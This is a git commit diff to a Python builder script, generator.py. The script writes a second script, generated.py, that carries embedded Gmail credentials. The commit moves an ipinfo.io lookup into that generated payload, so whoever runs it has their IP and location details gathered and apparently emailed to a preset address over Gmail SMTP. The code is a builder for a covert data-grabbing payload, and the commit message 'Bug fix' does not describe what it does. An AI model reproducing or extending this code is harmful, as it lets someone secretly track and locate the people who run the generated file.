b77eca944f9aa93aec093ca22bd2e44d36b85b7d
Adam Sarhan <adamsa09@gmail.com>
2021-02-27 19:55:01 -0500

    Bug fix

--- generator.py
+++ generator.py
@@ -1,4 +1,3 @@
-import requests
 import json
 from sys import argv, exit
 from email.mime.text import MIMEText
@@ -6,10 +5,32 @@ from email.mime.multipart import MIMEMultipart
 
 # Before you start, go to https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4O13KGBUwF9HwEI0q6D634Jj7VWs9WEG4fnoJhshHctblM9kwofamyR0lqEjekUtfJ9PWn8O73_1ywEhFwVaYVhsV-_Pg\nand enable less secure apps. When finished, click enter in the console.
 
-print('Loading...')
+sender_email = ''
+sender_password = ''
+recv_email = ''
+message = ''
+subject = ''
+
+with open('config.json') as f:
+    data = json.load(f)
+    sender_email = data['sender_email']
+    sender_password = data['sender_password']
+    recv_email = data['recv_email']
+    subject = data['subject']
+
+with open('generated.py', 'w') as f:
+    filedata = f'''
+# coding: ISO-8859-1
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import ssl
+import smtplib
+import requests
+
 r = requests.get('https://ipinfo.io')
 ipinfo = r.json()
-
 
 def findinfo(data):
     msg = ''
@@ -38,51 +59,11 @@ def findinfo(data):
     return msg
 
 
-sender_email = ''
-sender_password = ''
-recv_email = ''
-message = ''
-subject = ''
-
-with open('config.json') as f:
-    data = json.load(f)
-    sender_email = data['sender_email']
-    sender_password = data['sender_password']
-    recv_email = data['recv_email']
-    subject = data['subject']
-    message = findinfo(data)
-
-msg = MIMEMultipart()
-msg['Subject'] = subject
-msg['From'] = sender_email
-msg['To'] = recv_email
-msg.attach(MIMEText(message))
-
-# port = 465
-
-
-# context = ssl.create_default_context()
-
-
-# with smtplib.SMTP_SSL('smtp.gmail.com', port, context=context) as server:
-#     server.login(sender_email, sender_password)
-#     server.sendmail(sender_email, recv_email, msg.as_string())
-
-with open('generated.py', 'w') as f:
-    filedata = f'''
-# coding: ISO-8859-1
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-from email.mime.base import MIMEBase
-from email import encoders
-import ssl
-import smtplib
-
 sender_email = '{sender_email}'
 sender_password = '{sender_password}'
 recv_email = '{recv_email}'
 subject = '{subject}'
-message = '{message}'
+message = findinfo({data})
 
 msg = MIMEMultipart()
 msg['Subject'] = subject
